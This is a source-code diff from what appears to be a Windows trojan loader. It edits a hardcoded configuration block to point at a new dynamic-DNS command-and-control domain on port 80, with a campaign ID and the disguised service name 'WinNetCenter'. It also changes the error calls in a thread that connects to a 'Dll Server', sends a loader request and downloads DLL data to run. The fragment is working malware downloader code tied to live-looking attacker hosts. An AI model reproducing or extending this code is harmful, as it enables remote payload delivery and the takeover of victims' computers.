@@ -20,6 +20,8 @@ unsigned long _stdcall resolve(char *host)
 
 	if (i < 0) //Not Ip
 	{
+		MsgErr("Host mode");
+
 		ser = (struct hostent*)gethostbyname(host);
 
 		if (ser == NULL)
@@ -51,8 +53,8 @@ struct MODIFY_DATA
 	int   ServerPort;		//Client port						481
 } modify_data =
 {
-	"botovinik.vicp.net",
-	"150706",
+	"lkyfire.vicp.net:80",
+	"150911",
 	405,
 	FALSE,
 	"WinNetCenter",
@@ -78,7 +80,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 	if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
-		DbgErr("Can't Connect to Dll Server");
+		MsgErr("Can't Connect to Dll Server");
 #ifndef DE
 		Sleep(30000);
 #endif
@@ -95,14 +97,14 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 	if (!SendMsg(MainSocket, NULL, &msgHead))
 	{
-		DbgErr("Loader Request Can't Send");
+		MsgErr("Loader Request Can't Send");
 		closesocket(MainSocket);
 		return 1;
 	}
 
 	if (!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
 	{
-		DbgErr("Can't Recv Dll Data Head");
+		MsgErr("Can't Recv Dll Data Head");
 
 		return 1;
 	}
@@ -111,7 +113,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 	if (!RecvData(MainSocket, buf, msgHead.dwSize))
 	{
-		DbgErr("Can't Recv Dll Data");
+		MsgErr("Can't Recv Dll Data");
 
 		return 1;
 	}
